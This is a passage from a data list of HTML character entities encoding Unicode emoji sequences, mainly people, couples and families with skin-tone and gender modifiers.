'&#x1f468;&#x1f3ff;&#x200d;&#x1f91d;&#x200d;&#x1f468;&#x1f3fe;', '&#x1f469;&#x1f3fb;&#x200d;&#x1f91d;&#x200d;&#x1f468;&#x1f3fc;', '&#x1f469;&#x1f3fb;&#x200d;&#x1f91d;&#x200d;&#x1f468;&#x1f3fd;', '&#x1f469;&#x1f3fb;&#x200d;&#x1f91d;&#x200d;&#x1f468;&#x1f3fe;', '&#x1f469;&#x1f3fb;&#x200d;&#x1f91d;&#x200d;&#x1f468;&#x1f3ff;', '&#x1f469;&#x1f3fb;&#x200d;&#x1f91d;&#x200d;&#x1f469;&#x1f3fc;', '&#x1f469;&#x1f3fb;&#x200d;&#x1f91d;&#x200d;&#x1f469;&#x1f3fd;', '&#x1f469;&#x1f3fb;&#x200d;&#x1f91d;&#x200d;&#x1f469;&#x1f3fe;', '&#x1f469;&#x1f3fb;&#x200d;&#x1f91d;&#x200d;&#x1f469;&#x1f3ff;', '&#x1f469;&#x1f3fc;&#x200d;&#x1f91d;&#x200d;&#x1f468;&#x1f3fb;', '&#x1f469;&#x1f3fc;&#x200d;&#x1f91d;&#x200d;&#x1f468;&#x1f3fd;', '&#x1f469;&#x1f3fc;&#x200d;&#x1f91d;&#x200d;&#x1f468;&#x1f3fe;', '&#x1f469;&#x1f3fc;&#x200d;&#x1f91d;&#x200d;&#x1f468;&#x1f3ff;', '&#x1f469;&#x1f3fc;&#x200d;&#x1f91d;&#x200d;&#x1f469;&#x1f3fb;', '&#x1f469;&#x1f3fc;&#x200d;&#x1f91d;&#x200d;&#x1f469;&#x1f3fd;', '&#x1f469;&#x1f3fc;&#x200d;&#x1f91d;&#x200d;&#x1f469;&#x1f3fe;', '&#x1f469;&#x1f3fc;&#x200d;&#x1f91d;&#x200d;&#x1f469;&#x1f3ff;', '&#x1f469;&#x1f3fd;&#x200d;&#x1f91d;&#x200d;&#x1f468;&#x1f3fb;', '&#x1f469;&#x1f3fd;&#x200d;&#x1f91d;&#x200d;&#x1f468;&#x1f3fc;', '&#x1f469;&#x1f3fd;&#x200d;&#x1f91d;&#x200d;&#x1f468;&#x1f3fe;', '&#x1f469;&#x1f3fd;&#x200d;&#x1f91d;&#x200d;&#x1f468;&#x1f3ff;', '&#x1f469;&#x1f3fd;&#x200d;&#x1f91d;&#x200d;&#x1f469;&#x1f3fb;', '&#x1f469;&#x1f3fd;&#x200d;&#x1f91d;&#x200d;&#x1f469;&#x1f3fc;', '&#x1f469;&#x1f3fd;&#x200d;&#x1f91d;&#x200d;&#x1f469;&#x1f3fe;', '&#x1f469;&#x1f3fd;&#x200d;&#x1f91d;&#x200d;&#x1f469;&#x1f3ff;', '&#x1f469;&#x1f3fe;&#x200d;&#x1f91d;&#x200d;&#x1f468;&#x1f3fb;', '&#x1f469;&#x1f3fe;&#x200d;&#x1f91d;&#x200d;&#x1f468;&#x1f3fc;', '&#x1f469;&#x1f3fe;&#x200d;&#x1f91d;&#x200d;&#x1f468;&#x1f3fd;', '&#x1f469;&#x1f3fe;&#x200d;&#x1f91d;&#x200d;&#x1f468;&#x1f3ff;', '&#x1f469;&#x1f3fe;&#x200d;&#x1f91d;&#x200d;&#x1f469;&#x1f3fb;', '&#x1f469;&#x1f3fe;&#x200d;&#x1f91d;&#x200d;&#x1f469;&#x1f3fc;', '&#x1f469;&#x1f3fe;&#x200d;&#x1f91d;&#x200d;&#x1f469;&#x1f3fd;', '&#x1f469;&#x1f3fe;&#x200d;&#x1f91d;&#x200d;&#x1f469;&#x1f3ff;', '&#x1f469;&#x1f3ff;&#x200d;&#x1f91d;&#x200d;&#x1f468;&#x1f3fb;', '&#x1f469;&#x1f3ff;&#x200d;&#x1f91d;&#x200d;&#x1f468;&#x1f3fc;', '&#x1f469;&#x1f3ff;&#x200d;&#x1f91d;&#x200d;&#x1f468;&#x1f3fd;', '&#x1f469;&#x1f3ff;&#x200d;&#x1f91d;&#x200d;&#x1f468;&#x1f3fe;', '&#x1f469;&#x1f3ff;&#x200d;&#x1f91d;&#x200d;&#x1f469;&#x1f3fb;', '&#x1f469;&#x1f3ff;&#x200d;&#x1f91d;&#x200d;&#x1f469;&#x1f3fc;', '&#x1f469;&#x1f3ff;&#x200d;&#x1f91d;&#x200d;&#x1f469;&#x1f3fd;', '&#x1f469;&#x1f3ff;&#x200d;&#x1f91d;&#x200d;&#x1f469;&#x1f3fe;', '&#x1f9d1;&#x1f3fb;&#x200d;&#x1f91d;&#x200d;&#x1f9d1;&#x1f3fb;', '&#x1f9d1;&#x1f3fb;&#x200d;&#x1f91d;&#x200d;&#x1f9d1;&#x1f3fc;', '&#x1f9d1;&#x1f3fb;&#x200d;&#x1f91d;&#x200d;&#x1f9d1;&#x1f3fd;', '&#x1f9d1;&#x1f3fb;&#x200d;&#x1f91d;&#x200d;&#x1f9d1;&#x1f3fe;', '&#x1f9d1;&#x1f3fb;&#x200d;&#x1f91d;&#x200d;&#x1f9d1;&#x1f3ff;', '&#x1f9d1;&#x1f3fc;&#x200d;&#x1f91d;&#x200d;&#x1f9d1;&#x1f3fb;', '&#x1f9d1;&#x1f3fc;&#x200d;&#x1f91d;&#x200d;&#x1f9d1;&#x1f3fc;', '&#x1f9d1;&#x1f3fc;&#x200d;&#x1f91d;&#x200d;&#x1f9d1;&#x1f3fd;', '&#x1f9d1;&#x1f3fc;&#x200d;&#x1f91d;&#x200d;&#x1f9d1;&#x1f3fe;', '&#x1f9d1;&#x1f3fc;&#x200d;&#x1f91d;&#x200d;&#x1f9d1;&#x1f3ff;', '&#x1f9d1;&#x1f3fd;&#x200d;&#x1f91d;&#x200d;&#x1f9d1;&#x1f3fb;', '&#x1f9d1;&#x1f3fd;&#x200d;&#x1f91d;&#x200d;&#x1f9d1;&#x1f3fc;', '&#x1f9d1;&#x1f3fd;&#x200d;&#x1f91d;&#x200d;&#x1f9d1;&#x1f3fd;', '&#x1f9d1;&#x1f3fd;&#x200d;&#x1f91d;&#x200d;&#x1f9d1;&#x1f3fe;', '&#x1f9d1;&#x1f3fd;&#x200d;&#x1f91d;&#x200d;&#x1f9d1;&#x1f3ff;', '&#x1f9d1;&#x1f3fe;&#x200d;&#x1f91d;&#x200d;&#x1f9d1;&#x1f3fb;', '&#x1f9d1;&#x1f3fe;&#x200d;&#x1f91d;&#x200d;&#x1f9d1;&#x1f3fc;', '&#x1f9d1;&#x1f3fe;&#x200d;&#x1f91d;&#x200d;&#x1f9d1;&#x1f3fd;', '&#x1f9d1;&#x1f3fe;&#x200d;&#x1f91d;&#x200d;&#x1f9d1;&#x1f3fe;', '&#x1f9d1;&#x1f3fe;&#x200d;&#x1f91d;&#x200d;&#x1f9d1;&#x1f3ff;', '&#x1f9d1;&#x1f3ff;&#x200d;&#x1f91d;&#x200d;&#x1f9d1;&#x1f3fb;', '&#x1f9d1;&#x1f3ff;&#x200d;&#x1f91d;&#x200d;&#x1f9d1;&#x1f3fc;', '&#x1f9d1;&#x1f3ff;&#x200d;&#x1f91d;&#x200d;&#x1f9d1;&#x1f3fd;', '&#x1f9d1;&#x1f3ff;&#x200d;&#x1f91d;&#x200d;&#x1f9d1;&#x1f3fe;', '&#x1f9d1;&#x1f3ff;&#x200d;&#x1f91d;&#x200d;&#x1f9d1;&#x1f3ff;', '&#x1f468;&#x200d;&#x1f468;&#x200d;&#x1f466;&#x200d;&#x1f466;', '&#x1f468;&#x200d;&#x1f468;&#x200d;&#x1f467;&#x200d;&#x1f466;', '&#x1f468;&#x200d;&#x1f468;&#x200d;&#x1f467;&#x200d;&#x1f467;', '&#x1f468;&#x200d;&#x1f469;&#x200d;&#x1f466;&#x200d;&#x1f466;', '&#x1f468;&#x200d;&#x1f469;&#x200d;&#x1f467;&#x200d;&#x1f466;', '&#x1f468;&#x200d;&#x1f469;&#x200d;&#x1f467;&#x200d;&#x1f467;', '&#x1f469;&#x200d;&#x1f469;&#x200d;&#x1f466;&#x200d;&#x1f466;', '&#x1f469;&#x200d;&#x1f469;&#x200d;&#x1f467;&#x200d;&#x1f466;', '&#x1f469;&#x200d;&#x1f469;&#x200d;&#x1f467;&#x200d;&#x1f467;', '&#x1f468;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f468;', '&#x1f469;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f468;', '&#x1f469;&#x200d;&#x2764;&#xfe0f;&#x200d;&#x1f469;', '&#x1faf1;&#x1f3fb;&#x200d;&#x1faf2;&#x1f3fc;', '&#x1faf1;&#x1f3fb;&#x200d;&#x1faf2;&#x1f3fd;', '&#x1faf1;&#x1f3fb;&#x200d;&#x1faf2;&#x1f3fe;', '&#x1faf1;&#x1f3fb;&#x200d;&#x1faf2;&#x1f3ff;', '&#x1faf1;&#x1f3fc;&#x200d;&#x1faf2;&#x1f3fb;', '&#x1faf1;&#x1f3fc;&#x200d;&#x1faf2;&#x1f3fd;', '&#x1faf1;&#x1f3fc;&#x200d;&#x1faf2;&#x1f3fe;', '&#x1faf1;&#x1f3fc;&#x200d;&#x1faf2;&#x1f3ff;', '&#x1faf1;&#x1f3fd;&#x200d;&#x1faf2;&#x1f3fb;', '&#x1faf1;&#x1f3fd;&#x200d;&#x1faf2;&#x1f3fc;', '&#x1faf1;&#x1f3fd;&#x200d;&#x1faf2;&#x1f3fe;', '&#x1faf1;&#x1f3fd;&#x200d;&#x1faf2;&#x1f3ff;', '&#x1faf1;&#x1f3fe;&#x200d;&#x1faf2;&#x1f3fb;', '&#x1faf1;&#x1f3fe;&#x200d;&#x1faf2;&#x1f3fc;', '&#x1faf1;&#x1f3fe;&#x200d;&#x1faf2;&#x1f3fd;', '&#x1faf1;&#x1f3fe;&#x200d;&#x1faf2;&#x1f3ff;', '&#x1faf1;&#x1f3ff;&#x200d;&#x1faf2;&#x1f3fb;', '&#x1faf1;&#x1f3ff;&#x200d;&#x1faf2;&#x1f3fc;', '&#x1faf1;&#x1f3ff;&#x200d;&#x1faf2;&#x1f3fd;', '&#x1faf1;&#x1f3ff;&#x200d;&#x1faf2;&#x1f3fe;', '&#x1f468;&#x200d;&#x1f466;&#x200d;&#x1f466;', '&#x1f468;&#x200d;&#x1f467;&#x200d;&#x1f466;', '&#x1f468;&#x200d;&#x1f467;&#x200d;&#x1f467;', '&#x1f468;&#x200d;&#x1f468;&#x200d;&#x1f466;', '&#x1f468;&#x200d;&#x1f468;&#x200d;&#x1f467;', '&#x1f468;&#x200d;&#x1f469;&#x200d;&#x1f466;', '&#x1f468;&#x200d;&#x1f469;&#x200d;&#x1f467;', '&#x1f469;&#x200d;&#x1f466;&#x200d;&#x1f466;', '&#x1f469;&#x200d;&#x1f467;&#x200d;&#x1f466;', '&#x1f469;&#x200d;&#x1f467;&#x200d;&#x1f467;', '&#x1f469;&#x200d;&#x1f469;&#x200d;&#x1f466;', '&#x1f469;&#x200d;&#x1f469;&#x200d;&#x1f467;', '&#x1f9d1;&#x200d;&#x1f91d;&#x200d;&#x1f9d1;', '&#x1f3c3;&#x1f3fb;&#x200d;&#x2640;&#xfe0f;', '&#x1f3c3;&#x1f3fb;&#x200d;&#x2642;&#xfe0f;', '&#x1f3c3;&#x1f3fc;&#x200d;&#x2640;&#xfe0f;', '&#x1f3c3;&#x1f3fc;&#x200d;&#x2642;&#xfe0f;', '&#x1f3c3;&#x1f3fd;&#x200d;&#x2640;&#xfe0f;', '&#x1f3c3;&#x1f3fd;&#x200d;&#x2642;&#xfe0f;', '&#x1f3c3;&#x1f3fe;&#x200d;&#x2640;&#xfe0f;', '&#x1f3c3;&#x1f3fe;&#x200d;&#x2642;&#xfe0f;', '&#x1f3c3;&#x1f3ff;&#x200d;&#x2640;&#xfe0f;', '&#x1f3c3;&#x1f3ff;&#x200d;&#x2642;&#xfe0f;', '&#x1f3c4;&#x1f3fb;&#x200d;&#x2640;&#xfe0f;', '&#x1f3c4;&#x1f3fb;&#x200d;&#x2642;&#xfe0f;', '&#x1f3c4;&#x1f3fc;&#x200d;&#x2640;&#xfe0f;', '&#x1f3c4;&#x1f3fc;&#x200d;&#x2642;&#xfe0f;', '&#x1f3c4;&#x1f3fd;&#x200d;&#x2640;&#xfe0f;', '&#x1f3c4;&#x1f3fd;&#x200d;&#x2642;&#xfe0f;', '&#x1f3c4;&#x1f3fe;&#x200d;&#x2640;&#xfe0f;', '&#x1f3c4;&#x1f3fe;&#x200d;&#x2642;&#xfe0f;', '&#x1f3c4;&#x1f3ff;&#x200d;&#x2640;&#xfe0f;', '&#x1f3c4;&#x1f3ff;&#x200d;&#x2642;&#xfe0f;', '&#x1f3ca;&#x1f3fb;&#x200d;&#x2640;&#xfe0f;', '&#x1f3ca;&#x1f3fb;&#x200d;&#x2642;&#xfe0f;', '&#x1f3ca;&#x1f3fc;&#x200d;&#x2640;&#xfe0f;', '&#x1f3ca;&#x1f3fc;&#x200d;&#x2642;&#xfe0f;', '&#x1f3ca;&#x1f3fd;&#x200d;&#x2640;&#xfe0f;', '&#x1f3ca;&#x1f3fd;&#x200d;&#x2642;&#xfe0f;', '&#x1f3ca;&#x1f3fe;&#x200d;&#x2640;&#xfe0f;', '&#x1f3ca;&#x1f3fe;&#x200d;&#x2642;&#xfe0f;', '&#x1f3ca;&#x1f3ff;&#x200d;&#x2640;&#xfe0f;', '&#x1f3ca;&#x1f3ff;&#x200d;&#x2642;&#xfe0f;', '&#x1f3cb;&#x1f3fb;&#x200d;&#x2640;&#xfe0f;', '&#x1f3cb;&#x1f3fb;&#x200d;&#x2642;&#xfe0f;', '&#x1f3cb;&#x1f3fc;&#x200d;&#x2640;&#xfe0f;', '&#x1f3cb;&#x1f3fc;&#x200d;&#x2642;&#xfe0f;', '&#x1f3cb;&#x1f3fd;&#x200d;&#x2640;&#xfe0f;', '&#x1f3cb;&#x1f3fd;&#x200d;&#x2642;&#xfe0f;', '&#x1f3cb;&#x1f3fe;&#x200d;&#x2640;&#xfe0f;', '&#x1f3cb;&#x1f3fe;&#x200d;&#x2642;&#xfe0f;', '&#x1f3cb;&#x1f3ff;&#x200d;&#x2640;&#xfe0f;', '&#x1f3cb;&#x1f3ff;&#x200d;&#x2642;&#xfe0f;', '&#x1f3cc;&#x1f3fb;&#x200d;&#x2640;&#xfe0f;', '&#x1f3cc;&#x1f3fb;&#x200d;&#x2642;&#xfe0f;', '&#x1f3cc;&#x1f3fc;&#x200d;&#x2640;&#xfe0f;', '&#x1f3cc;&#x1f3fc;&#x200d;&#x2642;&#xfe0f;', '&#x1f3cc;&#x1f3fd;&#x200d;&#x2640;&#xfe0f;', '&#x1f3cc;&#x1f3fd;&#x200d;&#x2642;&#xfe0f;', '&#x1f3cc;&#x1f3fe;&#x200d;&#x2640;&#xfe0f;', '&#x1f3cc;&#x1f3fe;&#x200d;&#x2642;&#xfe0f;', '&#x1f3cc;&#x1f3ff;&#x200d;&#x2640;&#xfe0f;', '&#x1f3cc;&#x1f3ff;&#x200d;&#x2642;&#xfe0f;', '&#x1f468;&#x1f3fb;&#x200d;&#x2695;&#xfe0f;', '&#x1f468;&#x1f3fb;&#x200d;&#x2696;&#xfe0f;', '&#x1f468;&#x1f3fb;&#x200d;&#x2708;&#xfe0f;', '&#x1f468;&#x1f3fc;&#x200d;&#x2695;&#xfe0f;', '&#x1f468;&#x1f3fc;&#x200d;&#x2696;&#xfe0f;', '&#x1f468;&#x1f3fc;&#x200d;&#x2708;&#xfe0f;', '&#x1f468;&#x1f3fd;&#x200d;&#x2695;&#xfe0f;', '&#x1f468;&#x1f3fd;&#x200d;&#x2696;&#xfe0f;', '&#x1f468;&#x1f3fd;&#x200d;&#x2708;&#xfe0f;', '&#x1f468;&#x1f3fe;&#x200d;&#x2695;&#xfe0f;', '&#x1f468;&#x1f3fe;&#x200d;&#x2696;&#xfe0f;', '&#x1f468;&#x1f3fe;&#x200d;&#x2708;&#xfe0f;', '&#x1f468;&#x1f3ff;&#x200d;&#x2695;&#xfe0f;', '&#x1f468;&#x1f3ff;&#x200d;&#x2696;&#xfe0f;', '&#x1f468;&#x1f3ff;&#x200d;&#x2708;&#xfe0f;', '&#x1f469;&#x1f3fb;&#x200d;&#x2695;&#xfe0f;', '&#x1f469;&#x1f3fb;&#x200d;&#x2696;&#xfe0f;', '&#x1f469;&#x1f3fb;&#x200d;&#x2708;&#xfe0f;', '&#x1f469;&#x1f3fc;&#x200d;&#x2695;&#xfe0f;', '&#x1f469;&#x1f3fc;&#x200d;&#x2696;&#xfe0f;', '&#x1f469;&#x1f3fc;&#x200d;&#x2708;&#xfe0f;', '&#x1f469;&#x1f3fd;&#x200d;&#x2695;&#xfe0f;', '&#x1f469;&#x1f3fd;&#x200d;&#x2696;&#xfe0f;', '&#x1f469;&#x1f3fd;&#x200d;&#x2708;&#xfe0f;', '&#x1f469;&#x1f3fe;&#x200d;&#x2695;&#xfe0f;', '&#x1f469;&#x1f3fe;&#x200d;&#x2696;&#xfe0f;', '&#x1f469;&#x1f3fe;&#x200d;&#x2708;&#xfe0f;', '&#x1f469;&#x1f3ff;&#x200d;&#x2695;&#xfe0f;', '&#x1f469;&#x1f3ff;&#x200d;&#x2696;&#xfe0f;', '&#x1f469;&#x1f3ff;&#x200d;&#x2708;&#xfe0f;', '&#x1f46e;&#x1f3fb;&#x200d;&#x2640;&#xfe0f;', '&#x1f46e;&#x1f3fb;&#x200d;&#x2642;&#xfe0f;', '&#x1f46e;&#x1f3fc;&#x200d;&#x2640;&#xfe0f;', '&#x1f46e;&#x1f3fc;&#x200d;&#x2642;&#xfe0f;', '&#x1f46e;&#x1f3fd;&#x200d;&#x2640;&#xfe0f;', '&#x1f46e;&#x1f3fd;&#x200d;&#x2642;&#xfe0f;', '&#x1f46e;&#x1f3fe;&#x200d;&#x2640;&#xfe0f;', '&#x1f46e;&#x1f3fe;&#x200d;&#x2642;&#xfe0f;', '&#x1f46e;&#x1f3ff;&#x200d;&#x2640;&#xfe0f;', '&#x1f46e;&#x1f3ff;&#x200d;&#x2642;&#xfe0f;', '&#x1f470;&#x1f3fb;&#x200d;&#x2640;&#xfe0f;', '&#x1f470;&#x1f3fb;&#x200d;&#x2642;&#xfe0f;', '&#x1f470;&#x1f3fc;&#x200d;&#x2640;&#xfe0f;', '&#x1f470;&#x1f3fc;&#x200d;&#x2642;&#xfe0f;', '&#x1f470;&#x1f3fd;&#x200d;&#x2640;&#xfe0f;', '&#x1f470;&#x1f3fd;&#x200d;&#x2642;&#xfe0f;', '&#x1f470;&#x1f3fe;&#x200d;&#x2640;&#xfe0f;', '&#x1f470;&#x1f3fe;&#x200d;&#x2642;&#xfe0f;', '&#x1f470;&#x1f3ff;&#x200d;&#x2640;&#xfe0f;', '&#x1f470;&#x1f3ff;&#x200d;&#x2642;&#xfe0f;', '&#x1f471;&#x1f3fb;&#x200d;&#x2640;&#xfe0f;', '&#x1f471;&#x1f3fb;&#x200d;&#x2642;&#xfe0f;', '&#x1f471;&#x1f3fc;&#x200d;&#x2640;&#xfe0f;', '&#x1f471;&#x1f3fc;&#x200d;&#x2642;&#xfe0f;', '&#x1f471;&#x1f3fd;&#x200d;&#x2640;&#xfe0f;', '&#x1f471;&#x1f3fd;&#x200d;&#x2642;&#xfe0f;', '&#x1f471;&#x1f3fe;&#x200d;&#x2640;&#xfe0f;', '&#x1f471;&#x1f3fe;&#x200d;&#x2642;&#xfe0f;', '&#x1f471;&#x1f3ff;&#x200d;&#x2640;&#xfe0f;', '&#x1f471;&#x1f3ff;&#x200d;&#x2642;&#xfe0f;', '&#x1f473;&#x1f3fb;&#x200d;&#x2640;&#xfe0f;', '&#x1f473;&#x1f3fb;&#x200d;&#x2642;&#xfe0f;', '&#x1f473;&#x1f3fc;&#x200d;&#x2640;&#xfe0f;', '&#x1f473;&#x1f3fc;&#x200d;&#x2642;&#xfe0f;', '&#x1f473;&#x1f3fd;&#x200d;&#x2640;&#xfe0f;', '&#x1f473;&#x1f3fd;&#x200d;&#x2642;&#xfe0f;', '&#x1f473;&#x1f3fe;&#x200d;&#x2640;&#xfe0f;', '&#x1f473;&#x1f3fe;&#x200d;&#x2642;&#xfe0f;', '&#x1f473;&#x1f3ff;&#x200d;&#x2640;&#xfe0f;', '&#x1f473;&#x1f3ff;&#x200d;&#x2642;&#xfe0f;', '&#x1f477;&#x1f3fb;&#x200d;&#x2640;&#xfe0f;', '&#x1f477;&#x1f3fb;&#x200d;&#x2642;&#xfe0f;', '&#x1f477;&#x1f3fc;&#x200d;&#x2640;&#xfe0f;', '&#x1f477;&#x1f3fc;&#x200d;&#x2642;&#xfe0f;', '&#x1f477;&#x1f3fd;&#x200d;&#x2640;&#xfe0f;', '&#x1f477;&#x1f3fd;&#x200d;&#x2642;&#xfe0f;', '&#x1f477;&#x1f3fe;&#x200d;&#x2640;&#xfe0f;', '&#x1f477;&#x1f3fe;&#x200d;&#x2642;&#xfe0f;', '&#x1f477;&#x1f3ff;&#x200d;&#x2640;&#xfe0f;', '&#x1f477;&#x1f3ff;&#x200d;&#x2642;&#xfe0f;', '&#x1f481;&#x1f3fb;&#x200d;&#x2640;&#xfe0f;', '&#x1f481;&#x1f3fb;&#x200d;&#x2642;&#xfe0f;', '&#x1f481;&#x1f3fc;&#x200d;&#x2640;&#xfe0f;', '&#x1f481;&#x1f3fc;&#x200d;&#x2642;&#xfe0f;', '&#x1f481;&#x1f3fd;&#x200d;&#x2640;&#xfe0f;', '&#x1f481;&#x1f3fd;&#x200d;&#x2642;&#xfe0f;', '&#x1f481;&#x1f3fe;&#x200d;&#x2640;&#xfe0f;', '&#x1f481;&#x1f3fe;&#x200d;&#x2642;&#xfe0f;', '&#x1f481;&#x1f3ff;&#x200d;&#x2640;&#xfe0f;', '&#x1f481;&#x1f3ff;&#x200d;&#x2642;&#xfe0f;', '&#x1f482;&#x1f3fb;&#x200d;&#x2640;&#xfe0f;', '&#x1f482;&#x1f3fb;&#x200d;&#x2642;&#xfe0f;', '&#x1f482;&#x1f3fc;&#x200d;&#x2640;&#xfe0f;', '&#x1f482;&#x1f3fc;&#x200d;&#x2642;&#xfe0f;', '&#x1f482;&#x1f3fd;&#x200d;&#x2640;&#xfe0f;', '&#x1f482;&#x1f3fd;&#x200d;&#x2642;&#xfe0f;', '&#x1f482;&#x1f3fe;&#x200d;&#x2640;&#xfe0f;', '&#x1f482;&#x1f3fe;&#x200d;&#x2642;&#xfe0f;', '&#x1f482;&#x1f3ff;&#x200d;&#x2640;&#xfe0f;', '&#x1f482;&#x1f3ff;&#x200d;&#x2642;&#xfe0f;', '&#x1f486;&#x1f3fb;&#x200d;&#x2640;&#xfe0f;', '&#x1f486;&#x1f3fb;&#x200d;&#x2642;&#xfe0f;', '&#x1f486;&#x1f3fc;&#x200d;&#x2640;&#xfe0f;', '&#x1f486;&#x1f3fc;&#x200d;&#x2642;&#xfe0f;', '&#x1f486;&#x1f3fd;&#x200d;&#x2640;&#xfe0f;', '&#x1f486;&#x1f3fd;&#x200d;&#x2642;&#xfe0f;', '&#x1f486;&#x1f3fe;&#x200d;&#x2640;&#xfe0f;', '&#x1f486;&#x1f3fe;&#x200d;&#x2642;&#xfe0f;', '&#x1f486;&#x1f3ff;&#x200d;&#x2640;&#xfe0f;', '&#x1f486;&#x1f3ff;&#x200d;&#x2642;&#xfe0f;', '&#x1f487;&#x1f3fb;&#x200d;&#x2640;&#xfe0f;', '&#x1f487;&#x1f3fb;&#x200d;&#x2642;&#xfe0f;', '&#x1f487;&#x1f3fc;&#x200d;&#x2640;&#xfe0f;', '&#x1f487;&#x1f3fc;&#x200d;&#x2642;&#xfe0f;', '&#x1f487;&#x1f3fd;&#x200d;&#x2640;&#xfe0f;', '&#x1f487;&#x1f3fd;&#x200d;&#x2642;&#xfe0f;', '&#x1f487;&#x1f3fe;&#x200d;&#x2640;&#xfe0f;', '&#x1f487;&#x1f3fe;&#x200d;&#x2642;&#xfe0f;', '&#x1f487;&#x1f3ff;&#x200d;&#x2640;&#xfe0f;', '&#x1f487;&#x1f3ff;&#x200d;&#x2642;&#xfe0f;', '&#x1f574;&#x1f3fb;&#x200d;&#x2640;&#xfe0f;', '&#x1f574;&#x1f3fb;&#x200d;&#x2642;&#xfe0f;', '&#x1f574;&#x1f3fc;&#x200d;&#x2640;&#xfe0f;', '&#x1f574;&#x1f3fc;&#x200d;&#x2642;&#xfe0f;', '&#x1f574;&#x1f3fd;&#x200d;&#x2640;&#xfe0f;', '&#x1f574;&#x1f3fd;&#x200d;&#x2642;&#xfe0f;', '&#x1f574;&#x1f3fe;&#x200d;&#x2640;&#xfe0f;', '&#x1f574;&#x1f3fe;&#x200d;&#x2642;&#xfe0f;', '&#x1f574;&#x1f3ff;&#x200d;&#x2640;&#xfe0f;', '&#x1f574;&#x1f3ff;&#x200d;&#x2642;&#xfe0f;', '&#x1f575;&#x1f3fb;&#x200d;&#x2640;&#xfe0f;', '&#x1f575;&#x1f3fb;&#x200d;&#x2642;&#xfe0f;', '&#x1f575;&#x1f3fc;&#x200d;&#x2640;&#xfe0f;', '&#x1f575;&#x1f3fc;&#x200d;&#x2642;&#xfe0f;', '&#x1f575;&#x1f3fd;&#x200d;&#x2640;&#xfe0f;', '&#x1f575;&#x1f3fd;&#x200d;&#x2642;&#xfe0f;', '&#x1f575;&#x1f3fe;&#x200d;&#x2640;&#xfe0f;', '&#x1f575;&#x1f3fe;&#x200d;&#x2642;&#xfe0f;', '&#x1f575;&#x1f3ff;&#x200d;&#x2640;&#xfe0f;', '&#x1f575;&#x1f3ff;&#x200d;&#x2642;&#xfe0f;', '&#x1f645;&#x1f3fb;&#x200d;&#x2640;&#xfe0f;', '&#x1f645;&#x1f3fb;&#x200d;&#x2642;&#xfe0f;', '&#x1f645;&#x1f3fc;&#x200d;&#x2640;&#xfe0f;', '&#x1f645;&#x1f3fc;&#x200d;&#x2642;&#xfe0f;', '&#x1f645;&#x1f3fd;&#x200d;&#x2640;&#xfe0f;', '&#x1f645;&#x1f3fd;&#x200d;&#x2642;&#xfe0f;', '&#x1f645;&#x1f3fe;&#x200d;&#x2640;&#xfe0f;', '&#x1f645;&#x1f3fe;&#x200d;&#x2642;&#xfe0f;', '&#x1f645;&#x1f3ff;&#x200d;&#x2640;&#xfe0f;', '&#x1f645;&#x1f3ff;&#x200d;&#x2642;&#xfe0f;', '&#x1f646;&#x1f3fb;&#x200d;&#x2640;&#xfe0f;', '&#x1f646;&#x1f3fb;&#x200d;&#x2642;&#xfe0f;', '&#x1f646;&#x1f3fc;&#x200d;&#x2640;&#xfe0f;', '&#x1f646;&#x1f3fc;&#x200d;&#x2642;&#xfe0f;', '&#x1f646;&#x1f3fd;&#x200d;&#x2640;&#xfe0f;', '&#x1f646;&#x1f3fd;&#x200d;&#x2642;&#xfe0f;', '&#x1f646;&#x1f3fe;&#x200d;&#x2640;&#xfe0f;', '&#x1f646;&#x1f3fe;&#x200d;&#x2642;&#xfe0f;', '&#x1f646;&#x1f3ff;&#x200d;&#x2640;&#xfe0f;', '&#x1f646;&#x1f3ff;&#x200d;&#x2642;&#xfe0f;', '&#x1f647;&#x1f3fb;&#x200d;&#x2640;&#xfe0f;', '&#x1f647;&#x1f3fb;&#x200d;&#x2642;&#xfe0f;', '&#x1f647;&#x1f3fc;&#x200d;&#x2640;&#xfe0f;', '&#x1f647;&#x1f3fc;&#x200d;&#x2642;&#xfe0f;', '&#x1f647;&#x1f3fd;&#x200d;&#x2640;&#xfe0f;', '&#x1f647;&#x1f3fd;&#x200d;&#x2642;&#xfe0f;', '&#x1f647;&#x1f3fe;&#x200d;&#x2640;&#xfe0f;', '&#x1f647;&#x1f3fe;&#x200d;&#x2642;&#xfe0f;', '&#x1f647;&#x1f3ff;&#x200d;&#x2640;&#xfe0f;', '&#x1f647;&#x1f3ff;&#x200d;&#x2642;&#xfe0f;', '&#x1f64b;&#x1f3fb;&#x200d;&#x2640;&#xfe0f;', '&#x1f64b;&#x1f3fb;&#x200d;&#x2642;&#xfe0f;', '&#x1f64b;&#x1f3fc;&#x200d;&#x2640;&#xfe0f;', '&#x1f64b;&#x1f3fc;&#x200d;&#x2642;&#xfe0f;', '&#x1f64b;&#x1f3fd;&#x200d;&#x2640;&#xfe0f;', '&#x1f64b;&#x1f3fd;&#x200d;&#x2642;&#xfe0f;', '&#x1f64b;&#x1f3fe;&#x200d;&#x2640;&#xfe0f;', '&#x1f64b;&#x1f3fe;&#x200d;&#x2642;&#xfe0f;', '&#x1f64b;&#x1f3ff;&#x200d;&#x2640;&#xfe0f;', '&#x1f64b;&#x1f3ff;&#x200d;&#x2642;&#xfe0f;', '&#x1f64d;&#x1f3fb;&#x200d;&#x2640;&#xfe0f;', '&#x1f64d;&#x1f3fb;&#x200d;&#x2642;&#xfe0f;', '&#x1f64d;&#x1f3fc;&#x200d;&#x2640;&#xfe0f;', '&#x1f64d;&#x1f3fc;&#x200d;&#x2642;&#xfe0f;', '&#x1f64d;&#x1f3fd;&#x200d;&#x2640;&#xfe0f;', '&#x1f64d;&#x1f3fd;&#x200d;&#x2642;&#xfe0f;', '&#x1f64d;&#x1f3fe;&#x200d;&#x2640;&#xfe0f;', '&#x1f64d;&#x1f3fe;&#x200d;&#x2642;&#xfe0f;', '&#x1f64d;&#x1f3ff;&#x200d;&#x2640;&#xfe0f;', '&#x1f64d;&#x1f3ff;&#x200d;&#x2642;&#xfe0f;', '&#x1f64e;&#x1f3fb;&#x200d;&#x2640;&#xfe0f;', '&#x1f64e;&#x1f3fb;&#x200d;&#x2642;&#xfe0f;', '&#x1f64e;&#x1f3fc;&#x200d;&#x2640;&#xfe0f;', '&#x1f64e;&#x1f3fc;&#x200d;&#x2642;&#xfe0f;', '&#x1f64e;&#x1f3fd;&#x200d;&#x2640;&#xfe0f;', 